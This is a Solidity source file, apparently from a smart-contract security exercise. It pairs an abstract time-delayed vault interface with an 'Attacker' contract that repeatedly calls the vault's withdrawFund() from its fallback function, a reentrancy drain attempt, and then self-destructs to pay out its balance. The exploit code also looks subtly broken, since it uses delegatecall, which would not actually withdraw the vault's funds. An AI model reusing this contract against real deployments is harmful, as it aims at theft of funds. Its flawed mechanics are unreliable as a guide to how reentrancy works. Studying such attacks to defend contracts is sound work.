pragma solidity ^0.4.17;

contract TimeDelayedVaultAbstract {
    address[] public authorizedUsers;
    address public additionalAuthorizedContract;
    uint public lastUpdated;
    address owner;
    
    function() public payable { }

    modifier onlyAuthorized() {
        bool pass = false;
        if(additionalAuthorizedContract == msg.sender) {
            pass = true;
        }
        
        for (uint i = 0; i < authorizedUsers.length; i++) {
            if(authorizedUsers [i] == msg.sender) {
                pass = true;
                break;
            }
        }
        require (pass);
        _;
    }
    
    modifier onlyOnce() {
        require(owner == 0x0);
        _;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    modifier recordAction() {
        lastUpdated = now;
        _;
    }
    
    function setObserver(address ob) {}
    
    function addToReserve() payable recordAction external returns (uint) { }
    
    
    function withdrawFund() onlyAuthorized external returns (bool) {  }
    
    function addAuthorizedAccount(uint votePosition, address proposal) onlyAuthorized external { }
    
    function resolve() onlyOwner { }

}

contract Attacker {
    // limit the recursive calls to prevent out-of-gas error
    uint public stack = 0;
    uint constant stackLimit = 50;
    TimeDelayedVaultAbstract timeDelayedVault;

    function getBalance() returns (uint) {
        return this.balance;
    }

    function Attacker(address tdvaultAddress) payable {
        timeDelayedVault = TimeDelayedVaultAbstract(tdvaultAddress);
    }

    function attack() {
        timeDelayedVault.delegatecall(bytes4(sha3("withdrawFund()")));
    }

    // fallback function
    function() payable {
        if(stack++ < stackLimit) {
            timeDelayedVault.delegatecall(bytes4(sha3("withdrawFund()")));
        }
    }

    function resolve() {
        selfdestruct(msg.sender);
    }
}